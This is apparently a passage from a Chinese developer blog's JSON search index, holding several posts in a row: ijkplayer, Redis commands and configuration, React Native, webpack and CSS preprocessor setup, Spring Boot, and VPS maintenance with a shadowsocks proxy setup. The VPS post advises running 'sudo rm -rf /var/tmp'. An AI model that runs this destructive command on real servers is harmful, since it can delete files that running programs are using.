ffp-&gt;mediacodec_hevc || ffp-&gt;mediacodec_mpeg2) node = ffpipenode_create_video_decoder_from_android_mediacodec(ffp, pipeline, opaque-&gt;weak_vout); //如果设置了option则选用mediaCode if (!node) { //否则使用ffmpeg node = ffpipenode_create_video_decoder_from_ffplay(ffp); } return node; } 视频输出不管视频解码还是音频解码，其基本流程都是从解码前的数据缓冲区中取出一帧数据进行解码，完成后放入相应的解码后的数据缓冲区 音频输出ijkplayer中Android平台使用OpenGL ES或AudioTrack输出音频，iOS平台使用AudioQueue输出音频。 视频的音视频同步通常音视频同步的解决方案就是选择一个参考时钟，播放时读取音视频帧上的时间戳，同时参考当前时钟参考时钟上的时间来安排播放ijkplayer在默认情况下也是使用音频作为参考时钟源，处理同步的过程主要在视频渲染video_refresh_thread的线程中： ijkplayer现在看来似乎只是ffmpeg的一层wrapper MediaCodec应该就是硬解，ffmpeg是软解(后面好像支持了硬解) 参考 Ijkplayer解析ffmpeg c语言写一个video playerffmpeg的node js 包装nginx搭建rtmp推流服务ijkplayer如何使用FFmpeg 4.0内核？微信Android视频编码爬过的那些坑 使用Neon指令B站有一个AndroidVideoCache通过本地ServerSocket的形式实现了边看边缓存 具体实现是读的时候读所在的线程每隔一秒wait(1000)(这一秒中其实读取远程server数据的线程一直在跑)然后去读，很好的框架。 tbdopencvplay video using ffmplayer","tags":[]},{"title":"redis-cook-book","date":"2018-01-20T08:19:20.000Z","path":"2018/01/20/2018-01-20-redis-cook-book/","text":"redis速度相当快 在ubuntu上安装，偷懒就直接用这种方式吧，比自己下载源码编译快，还连systemd脚本都写好了。当然缺点就是/etc/apt/source.list文件里面的源太老的缘故。据说apt-get最多就能装上3.2的redis了，ubuntu更新最新软件最新版本也不会那么快 sudo add-apt-repository ppa:chris-lea/redis-serversudo apt-get updatesudo apt-get install redis-server sudo apt-get install redis-server how-to-install-redis-on-ubuntu-16-04 也有自己下源码编译的mac上就是下载一个tar.gz，然后自己make，网上教程都很多的 The Redis project does not officially support Windows. However, the Microsoft Open Tech group develops and maintains this Windows port targeting Win64. 直接从release page下载msi文件，安装下去很方便的。默认的端口是6379。 start server and client(windows下cd 到redis安装的位置，默认在C：Porgram Files/Redis里面) redis-server redis.windows.conf双击打开 redis-cli.exe ## start client 在mac下运行server: redis-server ## 起服务端redis-cli ## 起客户端redis-cli ping ## 看下服务端有没有起来redis-cli shutdown ## 关闭客户端 开了要会关闭 禁止任何remote访问 To make it automatically start with Linuxsudo systemctl enable redis_6379 To block all remote traffic to Redis except for local and one IP address (e.g. your web server)iptables -A INPUT -p tcp –dport 6379 -s 127.0.0.1 -j ACCEPTiptables -A INPUT -p tcp –dport 6379 -s X.X.X.X -j ACCEPTiptables -A INPUT -p tcp –dport 6379 -j DROP 和数据库类似，不同业务的数据需要存贮在不同的数据库中，redis提供了client端的切换数据库的语法 select 1 ## 每个数据库之间的key不冲突 Configurations sudo find / -name “redis.conf” ## linux下应该是装到了/etc/redis/这个目录下，不确定的话find一下 常见的配置包括： port 6379 ## redis-server监听端口（默认6379）requirepass ## 指定客户端操作需要的密码databases 16 ## 这里面对于可供选择的数据库总数 错误处理当内存达到最大值的时候Redis会选择删除哪些数据？有五种方式可供选择 volatile-lru -&gt; 利用LRU算法移除设置过过期时间的key (LRU:最近使用 Least Recently Used )allkeys-lru -&gt; 利用LRU算法移除任何keyvolatile-random -&gt; 移除设置过过期时间的随机keyallkeys-&gt;random -&gt; remove a random key, any keyvolatile-ttl -&gt; 移除即将过期的key(minor TTL)noeviction -&gt; 不移除任何可以，只是返回一个写错误 支持的存储类型 Strings Hashes Lists Sets Sorted Sets 针对各种数据进行CURD操作最简单的SET和GET举个例子 &gt;&gt;SET realname &quot;John Smith&quot; ##亲测，这个realname的key加不加引号没啥关系，value也是加不加引号没关系.SET命令直接无视双引号 &gt;&gt;OK &gt;&gt; GET realname &quot;John Smith&quot; String set(key, value)：给数据库中名称为key的string赋予值value get(key)：返回数据库中名称为key的string的value getset(key, value)：给名称为key的string赋予上一次的value mget(key1, key2,…, key N)：返回库中多个string的value setnx(key, value)：添加string，名称为key，值为value setex(key, time, value)：向库中添加string，设定过期时间time mset(key N, value N)：批量设置多个string的值 msetnx(key N, value N)：如果所有名称为key i的string都不存在 incr(key)：名称为key的string增1操作 incrby(key, integer)：名称为key的string增加integer decr(key)：名称为key的string减1操作 decrby(key, integer)：名称为key的string减少integer append(key, value)：名称为key的string的值附加value substr(key, start, end)：返回名称为key的string的value的子串 HashesA Redis hash is a collection of key value pairs. Redis Hashes are maps between string fields and string values. Hence, they are used to represent objects. Hashes用于代表object ## 添加操作 ## set redis&gt; HMSET myhash field1 &quot;Hello&quot; field2 &quot;World&quot; &quot;OK&quot; ## 只在field不存在的时候添加，可以理解为putIfAbsent HSETNX myhash field &quot;Hello&quot; ##返回1表明设置成功，返回0说明不成功 ## 查询操作 ## get redis&gt; HGET myhash field1 &quot;Hello&quot; redis&gt; HGET myhash field2 &quot;World&quot; ### delete a specified field from an object ## 删除操作 redis&gt; HSET myhash field1 &quot;foo&quot; redis&gt; HDEL myhash field1 ## 返回0表示不存在该key，返回1表示删除成功 ##检查是否存在某个field HEXISTS myhash field1 (integer) 1 ##1表示存在，0表示不存在 ## 把某个变量的值增加 HINCRBY myhash field 1 ## 返回操作成功后field 的当前value ##查看当前object有哪些field,类似于javaScript的iterating protoType HKEYS myhash ListsRedis Lists are simply lists of strings, sorted by insertion order. You can add elements to a Redis List on the head or on the tail. redis 127.0.0.1:6379&gt; lpush tutoriallist redis (integer) 1 redis 127.0.0.1:6379&gt; lpush tutoriallist mongodb (integer) 2 redis 127.0.0.1:6379&gt; lpush tutoriallist rabitmq (integer) 3 redis 127.0.0.1:6379&gt; lrange tutoriallist 0 10 1) &quot;rabitmq&quot; 2) &quot;mongodb&quot; 3) &quot;redis&quot; rpush(key, value)：在名称为key的list尾添加一个值为value的元素 lpush(key, value)：在名称为key的list头添加一个值为value的 元素 llen(key)：返回名称为key的list的长度 lrange(key, start, end)：返回名称为key的list中start至end之间的元素 ltrim(key, start, end)：截取名称为key的list lindex(key, index)：返回名称为key的list中index位置的元素 lset(key, index, value)：给名称为key的list中index位置的元素赋值 lrem(key, count, value)：删除count个key的list中值为value的元素 lpop(key)：返回并删除名称为key的list中的首元素 rpop(key)：返回并删除名称为key的list中的尾元素 blpop(key1, key2,… key N, timeout)：lpop命令的block版本。 brpop(key1, key2,… key N, timeout)：rpop的block版本。 rpoplpush(srckey, dstkey)：返回并删除名称为srckey的list的尾元素，并将该元素添加到名称为dstkey的list的头部 SET sadd(key, member)：向名称为key的set中添加元素member srem(key, member) ：删除名称为key的set中的元素member spop(key) ：随机返回并删除名称为key的set中一个元素 smove(srckey, dstkey, member) ：移到集合元素 scard(key) ：返回名称为key的set的基数 sismember(key, member) ：member是否是名称为key的set的元素 sinter(key1, key2,…key N) ：求交集 sinterstore(dstkey, (keys)) ：求交集并将交集保存到dstkey的集合 sunion(key1, (keys)) ：求并集 sunionstore(dstkey, (keys)) ：求并集并将并集保存到dstkey的集合 sdiff(key1, (keys)) ：求差集 sdiffstore(dstkey, (keys)) ：求差集并将差集保存到dstkey的集合 smembers(key) ：返回名称为key的set的所有元素 srandmember(key) ：随机返回名称为key的set的一个元素 一些特性的指令持久化save：将数据同步保存到磁盘 bgsave：将数据异步保存到磁盘 lastsave：返回上次成功将数据保存到磁盘的Unix时戳 shundown：将数据同步保存到磁盘，然后关闭服务 设定有效时间expireat 对Value的操作KEYS * 列出所有的key exists(key)：确认一个key是否存在 del(key)：删除一个key type(key)：返回值的类型 keys(pattern)：返回满足给定pattern的所有key randomkey：随机返回key空间的一个 keyrename(oldname, newname)：重命名key dbsize：返回当前数据库中key的数目 expire：设定一个key的活动时间（s） ttl：获得一个key的活动时间 select(index)：按索引查询 move(key, dbindex)：移动当前数据库中的key到dbindex数据库 flushdb：删除当前选择数据库中的所有key flushall：删除所有数据库中的所有key SubScribe和Publishredis 127.0.0.1:6379&gt; SUBSCRIBE redisChat Reading messages... (press Ctrl-C to quit) 1) &quot;subscribe&quot; 2) &quot;redisChat&quot; 3) (integer) 1 ## 另起一个screen PUBLISH redisChat &quot;Redis is a great caching technique&quot; ## 回到刚才的screen : ctrl +a +d screen -r 两个client同时subscribe了redisChat这个话题，表现上就和局域网聊天一样。也就有了很多用js+webSocket写的简易聊天室 pipelining一次请求/响应服务器能实现处理新的请求即使旧的请求还未被响应。这样就可以将多个命令发送到服务器，而不用等待回复，最后在一个步骤中读取该答复。省去了RTT(Round Trip deplay time)的时间。 非pipleline模式： Request----&gt;执行 ----&gt;Response Request----&gt;执行 ----&gt;Response Pipeline模式下： Request----&gt;执行，Server将响应结果队列化 Request----&gt;执行，Server将响应结果队列化 ----&gt;Response ----&gt;Response 和其他语言的整合支持的lanaguage client javaScriptnpm install redis在 Node.js 应用中集成 Redis jedisjava public void pipeline(){ String key = &quot;pipeline-test&quot;; String old = jedis.get(key); if(old != null){ System.out.println(&quot;Key:&quot; + key + &quot;,old value:&quot; + old); } //代码模式1,这种模式是最常见的方式 Pipeline p1 = jedis.pipelined(); p1.incr(key); System.out.println(&quot;Request incr&quot;); p1.incr(key); System.out.println(&quot;Request incr&quot;); //结束pipeline，并开始从相应中获得数据 List&lt;Object&gt; responses = p1.syncAndReturnAll(); if(responses == null || responses.isEmpty()){ throw new RuntimeException(&quot;Pipeline error: no response...&quot;); } for(Object resp : responses){ System.out.println(&quot;Response:&quot; + resp.toString());//注意，此处resp的类型为Long } //代码模式2 Pipeline p2 = jedis.pipelined(); Response&lt;Long&gt; r1 = p2.incr(key); try{ r1.get(); }catch(Exception e){ System.out.println(&quot;Error,you cant get() before sync,because IO of response hasn&#39;t begin..&quot;); } Response&lt;Long&gt; r2 = p2.incr(key); p2.sync(); System.out.println(&quot;Pipeline,mode 2,---&gt;&quot; + r1.get()); System.out.println(&quot;Pipeline,mode 2,---&gt;&quot; + r2.get()); } pythonredis-py使用Python操作Redis 应用场景 《Redis Cookbook》对这个经典场景进行详细描述。假定我们对一系列页面需要记录点击次数。例如论坛的每个帖子都要记录点击次数，而点击次数比回帖的次数的多得多。如果使用关系数据库来存储点击，可能存在大量的行级锁争用。所以，点击数的增加使用redis的INCR命令最好不过了。 存储多层次级别的objectRedis strings vs Redis hashes to represent JSON: efficiency? 由于redis各种commands本质上只能存储key-value形式的object，对于多层级的object，需要将key扁平化 var house = { roof: { color: &#39;black&#39; }, street: &#39;Market&#39;, buildYear: &#39;1996&#39; }; HMSET house:1 roof “house:1:roof” street “Market” buildYear “1996” 在redis中存储关系型数据 在redis中缓存session session 可以存放在 1）内存、2）cookie本身、3）redis 或 memcached 等缓存中，或者4）数据库中。线上来说，缓存的方案比较常见，存数据库的话，查询效率相比前三者都太低，不推荐 ================================================================================= Redis Cluster(集群)Redis集群需要版本3.0以上，另外起多个实例就是复制/usr/local/redis-server等文件多遍因为特别吃内存，小内存vps上不要乱搞 论述Redis和Memcached的差异-博客-云栖社区-阿里云 redis-server.service: Failed to run ‘start-pre’ task: No such file or directory 参考redis official docsRedis supports 5 types of data typesRedis 高级特性与性能调优大部分语句转载自关于pipelining的解释","tags":[]},{"title":"react-native-cookbook","date":"2018-01-19T22:28:34.000Z","path":"2018/01/19/2018-01-19-react-native-cookbook/","text":"install cli npm install -g react-native-clireact-native init myproject ## 最好全部小写字母cd myprojectreact-native run-android注意，可能会报错 FAILURE: Build failed with an exception. * What went wrong: A problem occurred configuring project &#39;:app&#39;. &gt; SDK location not found. Define location with sdk.dir in the local.properties file or with an ANDROID_HOME environment variable. 新建一个local.properities文件，放到android 文件夹下面就好了 unable-to-load-script-from-assets-index-android-bundle-on-windows 在android手机上打开显示布局边界，发现react-native app并不是一个webview，而是一个个实在的buttom,text。 tips目前暂不支持java 9Double tap R on your keyboard to reload其实并不是按电脑键盘上的R，而是模拟器上的，所以需要鼠标上去，ctrl+m即可如果是一台真实手机的话，需要摇一摇手机，就能显示菜单。但是每次都要摇一摇实在是太麻烦，所以点一下那个Enable LiveReload就能在每次保存文件后Reload。注意，如果更改了state，那么hotReload没用，需要手动Reload npm run start是用来起dev server的。react-native run-android是用来向client端推更新的。 could not connect to development server…的原因就是没有运行npm start。 所以，正常的流程应该是npm start &amp;&amp; react-native run-android debug:react-native run-android是把这个App安装到手机上，然后terminal就返回了，需要查看后续日志输出的话react-native log-android // 这个是帮助在console中输出log jsx文件开头的import要注意 // 这是错误的 import React, { AppRegistry, Component,StyleSheet,Text,View} from &#39;react-native&#39;; //这才是正确的 import React from &quot;react&quot;; import { AppRegistry, Component,StyleSheet,Text,View} from &#39;react-native&#39;; routeNavigator is deprecated,use stack navigator import React from &#39;react&#39;; import { View, Text } from &#39;react-native&#39;; import { StackNavigator } from &#39;react-navigation&#39;; // 1.0.0-beta.27 class HomeScreen extends React.Component { render() { return ( &lt;View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }}&gt; &lt;Text&gt;Home Screen&lt;/Text&gt; &lt;/View&gt; ); } } class DetailsScreen extends React.Component { render() { return ( &lt;View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }}&gt; &lt;Text&gt;Details Screen&lt;/Text&gt; &lt;/View&gt; ); } } const RootStack = StackNavigator( { Home: { screen: HomeScreen, }, Details: { screen: DetailsScreen, }, }, { initialRouteName: &#39;Home&#39;, } ); export default class App extends React.Component { render() { return &lt;RootStack /&gt;; } } 既然有路由就不免谈到各个组件之间的写法显然，你可以将LogoTitle写到另一个文件中去，然后export default，再import出来。下面这种只是为了说明你能这样写，一个很简单的小功能可以放在内部作为一个class自己使用。 class LogoTitle extends React.Component { render() { return ( &lt;Image source={require(&#39;./spiro.png&#39;)} style={{ width: 30, height: 30 }} /&gt; ); } } class HomeScreen extends React.Component { static navigationOptions = { // headerTitle instead of title headerTitle: &lt;LogoTitle /&gt;, }; /* render function, etc */ } stylinginline styling在每一个tag的后面跟上两个大括号，styling as seprate file在后面跟一个大括号，引用style对象的properityButton组件的styling仅限于几个属性，可以用TouchableXXX来代替 ComponentsButton是一个没什么大用处的控件，一般用TouchableOpacity包一层text去实现 ScrollViewAndroid平台一个ScrollView只能有一个ChildView(Node)，在react-native上似乎没有这样的限制 The React Native Button is very limited in what you can do, see; Button It does not have a style prop, and you don&#39;t set text the &quot;web-way&quot; like &lt;Button&gt;txt&lt;/Button&gt; but via the title property &lt;Button title=&quot;txt&quot; /&gt; If you want to have more control over the appearance you should use one of the TouchableXXXX&#39; components like TouchableOpacity They are really easy to use :-) // Adding alignItems to a component’s style determines the alignment of children along the secondary axis ==========================async storage camera Roll基于React Native构建的仿京东客户端","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"Webpack资源汇总","date":"2018-01-14T22:56:46.000Z","path":"2018/01/14/2018-01-14-webpack-instructions/","text":"使用webpack的一个好处是，浏览器的并发请求资源数是有一个上限的，把所有资源打成一个包，能够减少请求数量。webpack更新的速度是真快，目前(2018年9月最新版本已经到4.19) 1.安装 yarn add webpack 2.使用 webpack is basically pulling all external js files into on build.js file that we can bundle into our html.这样做的好处很多，能够有效减少浏览器发出的请求数量。 webpack -p即可 3. webpack.config.js从webpack-examplecopy一个webpack.config.js过来，基本可以搞定es6,less,hot-reload,css-plugin还有asset文件copy这些常见的需求。首先是package.json { &quot;name&quot;: &quot;try-webpack&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;build&quot;: &quot;webpack --mode production&quot;, &quot;start&quot;: &quot;webpack-dev-server --mode development&quot; }, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: { &quot;babel-core&quot;: &quot;^6.26.3&quot;, &quot;babel-loader&quot;: &quot;^7.1.5&quot;, &quot;babel-preset-env&quot;: &quot;^1.7.0&quot;, &quot;copy-webpack-plugin&quot;: &quot;^4.5.2&quot;, &quot;css-loader&quot;: &quot;^1.0.0&quot;, &quot;extract-text-webpack-plugin&quot;: &quot;^4.0.0-beta.0&quot;, &quot;file-loader&quot;: &quot;^1.1.11&quot;, &quot;html-webpack-plugin&quot;: &quot;^3.2.0&quot;, &quot;less&quot;: &quot;^3.7.0&quot;, &quot;webpack&quot;: &quot;^4.15.1&quot;, &quot;webpack-cli&quot;: &quot;^3.0.8&quot;, &quot;webpack-dev-server&quot;: &quot;^3.1.4&quot; }, &quot;dependencies&quot;: { &quot;less-loader&quot;: &quot;^4.1.0&quot;, &quot;lodash&quot;: &quot;^4.17.10&quot;, &quot;style-loader&quot;: &quot;^0.21.0&quot; } } webpack.config.js const path = require(&#39;path&#39;); const webpack = require(&#39;webpack&#39;); //引入的webpack,使用lodash const HtmlWebpackPlugin = require(&#39;html-webpack-plugin&#39;) //将html打包 const ExtractTextPlugin = require(&#39;extract-text-webpack-plugin&#39;) //打包的css拆分,将一部分抽离出来 const CopyWebpackPlugin = require(&#39;copy-webpack-plugin&#39;) // console.log(path.resolve(__dirname,&#39;dist&#39;)); //物理地址拼接 module.exports = { entry: &#39;./src/index.js&#39;, //入口文件 在vue-cli main.js output: { //webpack如何输出 path: path.resolve(__dirname, &#39;dist&#39;), //定位，输出文件的目标路径 filename: &#39;[name].js&#39; //默认生成的是main.js }, module: { //模块的相关配置 rules: [ //根据文件的后缀提供一个loader,解析规则 { test: /\\.js$/, //es6 =&gt; es5 include: [ path.resolve(__dirname, &#39;src&#39;) ], // exclude:[], 不匹配选项（优先级高于test和include） use: &#39;babel-loader&#39; }, { test: /\\.css/, use: ExtractTextPlugin.extract({ fallback: &#39;style-loader&#39;, use: [ &#39;css-loader&#39; ] }) }, { test: /\\.less$/, use: ExtractTextPlugin.extract({ fallback: &#39;style-loader&#39;, use: [ &#39;css-loader&#39;, &#39;less-loader&#39; ] }) }, { //图片loader test: /\\.(png|jpg|gif)$/, use: [ { loader: &#39;file-loader&#39; //根据文件地址加载文件 } ] } ] }, resolve: { //解析模块的可选项 // modules: [ ]//模块的查找目录 配置其他的css等文件 extensions: [&quot;.js&quot;, &quot;.json&quot;, &quot;.jsx&quot;,&quot;.less&quot;, &quot;.css&quot;], //用到文件的扩展名 alias: { //模块别名列表 utils: path.resolve(__dirname,&#39;src/utils&#39;) } }, plugins: [ //插进的引用, 压缩，分离美化 new ExtractTextPlugin(&#39;[name].css&#39;), //[name] 默认 也可以自定义name 声明使用 new HtmlWebpackPlugin({ //将模板的头部和尾部添加css和js模板,dist 目录发布到服务器上，项目包。可以直接上线 file: &#39;index.html&#39;, //打造单页面运用 最后运行的不是这个 template: &#39;src/index.html&#39; //vue-cli放在跟目录下 }), new CopyWebpackPlugin([ //src下其他的文件直接复制到dist目录下 { from:&#39;src/assets/favicon.ico&#39;,to: &#39;favicon.ico&#39; } ]), new webpack.ProvidePlugin({ //引用框架 jquery lodash工具库是很多组件会复用的，省去了import &#39;_&#39;: &#39;lodash&#39; //引用webpack }) ], devServer: { //服务于webpack-dev-server 内部封装了一个express port: &#39;1314&#39;, before(app) { app.get(&#39;/api/test.json&#39;, (req, res) =&gt; { res.json({ code: 200, message: &#39;Hello World&#39; }) }) } } } webpack devServer(内置一个express，在本地起一个local server) yarn add webpack-dev-server webpack-dev-server的介绍页是这么说的： Use webpack with a development server that provides live reloading. This should be used for development only.It uses webpack-dev-middleware under the hood, which provides fast in-memory access to the webpack assets.关键是热更新(还有dev-server提供的内容，比方说html这些东西是放在内存里面的，不存在实际上的文件) 但是devServer 的hot reload 只能监视js文件的变化，并不能监视html或者server content的变化。这需要browserSync以及BrowserSync plugin for Webpack. yarn add browsersync browser-sync-webpack-plugin HtmlWebpackPlugin目前已经可以做到和webpack-dev-server搭配实现html hot reload有了HtmlWebpackPlugin,html文件里面已经不需要写script或者css的tag了。直接在index.js里面去require(“./styles/index”)就行 4. babel(es 2015 -&gt; es5)首先需要知道的是mudule.exports那一套在浏览器里是不支持的。会出现”require is undefined…”。解决办法也有，安装babel就行了。babel的作用是把es2015的代码编译成es5的代码, 安装方式 yarn add babel-cli babel-preset-env 然后创建一个.babelrc文件 { &quot;presets&quot;: [&quot;env&quot;] } package.json中添加script:babel : “babel”命令行 ： npm run babel – index.js -o bundle.js -w ==================trash ======================================================================== 7. react cli and vue cli原理8. common front end javaScript librariesminify js(删掉所有的空行)underscore javaScript libraryhandlebars(模板) 参考请手写一个webpack4.0配置","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"css预处理语言","date":"2017-12-26T22:36:49.000Z","path":"2017/12/26/2017-12-26-less-is-more/","text":"css预处理语言简介 css预处理语言允许我们以更简单的方式编写样式，通过编译生成浏览器能够使用的css文件。 Sass 诞生于 2007 年，Ruby 编写，其语法功能都十分全面，可以说 它完全把 CSS 变成了一门编程语言。另外 在国内外都很受欢迎，并且它的项目团队很是强大 ，是一款十分优秀的预处理语言。 Stylus 诞生于 2010 年，来自 Node.js 社区，语法功能也和 Sass 不相伯仲，是一门十分独特的创新型语言。 Less 诞生于 2009 年，受Sass的影响创建的一个开源项目。 它扩充了 CSS 语言，增加了诸如变量、混合（mixin）、函数等功能，让 CSS 更易维护、方便制作主题、扩充（引用于官网）。 比较这三种预处理语言 1. Less 安装yarn add less/ or install globally /yarn global add less// Dead Simple LESS CSS Watch Compiler，实时监控less文件变化，更新到cssyarn add less-watch-compiler 使用lessc styles.less // 并不会生成任何css文件lessc styles.less styles.css //生成一个styles.css文件新建一个style.less文件 @background-color: #f4f4f4; body { background-color: @background-color; } 生成的css文件长这样： body { background-color: #f4f4f4; } //有变量，可以进行数学运算 @line-height: 1em+1em; //可以嵌套 @secondary-color: #20B2AA; ul { background-color: @background-color; li { color: @secondary-color; a { line-height: @line-height; } } } // 有继承 .btn { padding: 10px 15px; border: 0; .border-radius(10px); } .primary-btn:extend(.btn){ background: @primary-color; .text-color(@primary-color); } // 有函数（mixin），有没有入参都行 .bordered{ border-top: dotted 1px #000; border-bottom: solid2px #000; } .border-radius(@radius) { border-radius: @radius; } //还有if statement .text-color(@a) when (lightness(@a) &gt; = 50% ){ color: black; } .text-color(@a) when (lightness(@a) &lt; 50% ){ color: white; } filepath比如经常把一些文件挪到其他位置了，这下在css中引用的位置全部都要换， @images: &quot;images/&quot; @homepage-images: &quot;images/homepage/&quot; img { background: url(&quot;@{images}fruit.png&quot;); } import功能在main.less文件中 @import header.less@import menu.less直接用 更多的使用直接去Less查找就好了 less搭配webpack(webpack-dev-server使用)使用方式deadsimple-less-watch-compiler — watch lesswebpack-dev-server – watch js file changeswebpack-less-loader webpack.config.js module.exports = { module: { rules: [ { test: /\\.less$/, use: [ &#39;style-loader&#39;, { loader: &#39;css-loader&#39;, options: { importLoaders: 1 } }, &#39;less-loader&#39; ] } ] } } 在index.js中: import css from ‘styles.less’; 找了好久没有找到关于less-loader hot reload的设置，只好在package.json中设置 “dev”: “less-watch-compiler”,“start”:”webpack-dev-server –progress –hot –inline –config webpack.config.js &amp;&amp; yarn dev” 把两个command chain起来就是了 2.Stylus 安装yarn add stylusyarn add stylus-loader 使用stylus -w style.styl -o style.css //w表示watch line-height = 10px body margin: 0 padding: 0 h1 color: #5e5e5e line-height: line-height 生成的css文件长这样 body { margin: 0; padding: 0; } body h1 { color: #5e5e5e; line-height: 10px; } // mixin也有 border-radius(n) -webkit-border-radius n -moz-border-radius n border-radius n form input[type=button] border-radius(5px) 官网 当然日常开发中不可能一直手敲 stylus xxx xxx或者 lessc xxx xxx，因为有webpack-loader。 3. SassSass需要安装Ruby。SCSS 是 Sass 3 引入新的语法，其语法完全兼容 CSS3，并且继承了 Sass 的强大功能。也就是说，任何标准的 CSS3 样式表都是具有相同语义的有效的 SCSS 文件。 @mixin rounded($amount) { -moz-border-radius: $amount; -webkit-border-radius: $amount; border-radius: $amount; } Sass本身不带花括号，加上花括号和分号就成了SCSS了.","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"Spring Boot入门记录","date":"2017-12-13T23:19:33.000Z","path":"2017/12/13/2017-12-13-spring-boot-elementart-guide/","text":"关于Spring Boot的基本知识要点 1. 创建一个Spring Boot app 非常简单Creating a Spring Application in Intelij is darn Simple 2. 组件及用法2.1 Service2.2 Dao2.3 Entity2.4 Controller3. 一些配置Spring Boot修改内置Tomcat端口号：EmbeddedServletContainerCustomizer 或者在src/main/resources/application.yml文件中添加 server port: 8081 =================================================================在windows里面查看内网ip，从控制面板进去看是不准的，DHCP有效期过了自动换掉，得自己敲ipconfig，这样才是最及时的。 以Okio为例，maven的搜索网站是https://search.maven.org/remote_content?g=com.squareup.okio&amp;a=okio&amp;v=LATEST，实际下发的域名是https://repo1.maven.org/maven2/com/squareup/okio/okio/1.14.0/okio-1.14.0.jar。用wget看，是302重定向了。 在ubuntu下使用nginx部署Spring boot application example app 补充一些tomcat和servlet的知识tomcat是web container,servlet是处理业务逻辑的。servlet继承自HttpServlet,里面有doGet和doPost方法。servlet和请求的url的对应关系写在web.xml中。 下面是从一片关于如何使用命令行生成并运行jar的文章中摘抄的 |____src | |____main | | |____java | | | |____com | | | | |____remkohde | | |____resources | |____test |____target Above you created the recommended directory structure for a Java application. Java source files are saved in the ‘./src/main/java’ folder, the folder ‘./src/main/resources’ is added to the class-path to include resources like properties files to your Java application, test files are saved in ‘./src/test’, compiled class files are saved to ‘./target/classes’, and jar archives are saved to the ‘./target’ folder. 如上就是一般推荐的java application的目录结构。./src/main/java’ folder放的是java代码，‘./src/main/resources’是用来存放属性之类的文件的（被添加到classpath），test文件存放在‘./src/test’文件夹中，生成的class文件放在‘./target/classes’文件夹中，‘./target’文件夹中放的是jar文件 论如何正确地关闭springboot应用start.sh #!/bin/bash java -jar myapp.jar &amp; echo $! &gt; ./pid.file &amp; stop.sh #!/bin/bash kill $(cat ./pid.file) start_silent.sh #!/bin/bash nohup ./start.sh &gt; foo.out 2&gt; foo.err &lt; /dev/null &amp; 非嵌入式产品的Web应用，应使用预编译语句PreparedStatement代替直接的语句执行Statement，以防止SQL注入。 oracle文档中指出manifest文件最后一行要加上一个换行The manifest must end with a new line or carriage return. The last line will not be parsed properly if it does not end with a new line or carriage return. accessing-data-mysql在application.properties文件中可以写的一些配置","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"VPS维护的日常","date":"2017-12-11T16:20:16.000Z","path":"2017/12/11/2017-12-11-vps-maintenance/","text":"以下在 ubuntu 16.04.3 LTS 上通过 1. 小硬盘清理垃圾 sudo apt-get autoclean 清理旧版本的软件缓存sudo apt-get clean 清理所有软件缓存sudo apt-get autoremove 删除系统不再使用的孤立软件 sudo rm -rf /var/tmp ## 一般来说/tmp和/var/tmp/文件夹里面的东西可以随便删除，稳妥起见还是先看下这个目录下有没有什么文件被正在跑的程序使用：sudo lsof +D /var ## 我看到一大堆mysql的东西 ，另外说一下，为什么/tmp文件夹这么小，因为ubuntu系统每次重启都会把这里面清一下 把本机的一个文件上传到vps上如果之前改过ssh端口的话，这里端口自己可以改，目的地位置也可以指定 scp -P 22 porn.mp4 username@xxx.xxx.xxx.xxx:/home/username/ 2.必要软件刚装好的 ubuntu 需要执行以下步骤,都是些常用的软件 安装 git &gt; apt-get install git安装 python &gt; apt-get install python-2.7安装 python-setuptools &gt; apt-get install python-setuptools检查是否安装好： python –version 还有一些，比如 htophtop中各个process的state参考 D uninterruptible sleep (usually IO)R running or runnable (on run queue)S interruptible sleep (waiting for an event to complete)T stopped, either by a job control signal or because it is being traced.W paging (not valid since the 2.6.xx kernel)X dead (should never be seen)Z defunct (“zombie”) process, terminated but not reaped by its parent. 只安装security update sudo unattended-upgrades -d ## 加上-d和verbose的意思差不多 有些软件不是经常用就禁止开机启动吧 sudo systemctl disable mysql ##因为这事redis老是装不上 2.1 装 ss 下载 shadowsocks 源码编译git clone https://github.com/shadowsocks/shadowsocks 记得切换到 master 分支python setup.py build python setup.py install 检查下版本 ssserver –version 编辑配置文件 vim config.json { &quot;server&quot;: &quot;my_server_ip&quot;, &quot;server_port&quot;: 8388, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;: 1080, &quot;password&quot;: &quot;mypassword&quot;, &quot;timeout&quot;: 300, &quot;method&quot;: &quot;aes-256-cfb&quot;, &quot;fast_open&quot;: true } 使用ipv6的话(把”my_server_ip”改成”::”),这样访问通过ss访问ipv6.google.com就ok了(当然这要在确认host已有ipv6的前提下)这跟nginx ipv6 server block很像： listen 80 default_server;listen [::]:80 default_server ipv6only=on; 如果你的服务器Linux 内核在3.7+，可以开启fast_open 以降低延迟。linux 内核版本查看： cat /proc/version ssserver -c config.json -d start #启动完成python3 shadowsocks/server.py -c yourconfig.json ## 这样也行 检查下是否启动了 ps -ef | grep sss ss 命令 ssserver -c /etc/shadowsocks/config.json # 前台运行 ### 后台运行和停止 ssserver -c /etc/shadowsocks.json -d start -q ##加上-q是quiet的意思，only show warning and error ssserver -c /etc/shadowsocks.json -d stop ### 加入开机启动 ### 在/etc/rc.local中加入 sudo ssserver -c /etc/shadowsocks.json --user username -d start - 不要总是用root用户做事，adduser来做，给sudo权限即可 如果使用systemd来管理的话，就不要使用 -d参数，因为需要root权限，此时应该将ssserver的生命周期管理交给systemd nohup /net-speeder/net-speeder/net_speeder eth0 “tcp src port 12345” &gt; /dev/null 2&gt;&amp;1 &amp; 慎用！！一不小心会把自己的ip加到iptable黑名单里面//防止暴力扫描ss端口nohup tail -F /var/log/shadowsocks.log | python autoban.py &gt;log 2&gt;log &amp; 其实就是找“can not parse header when handling connection from”这句话，超过次数的加到iptable的ban 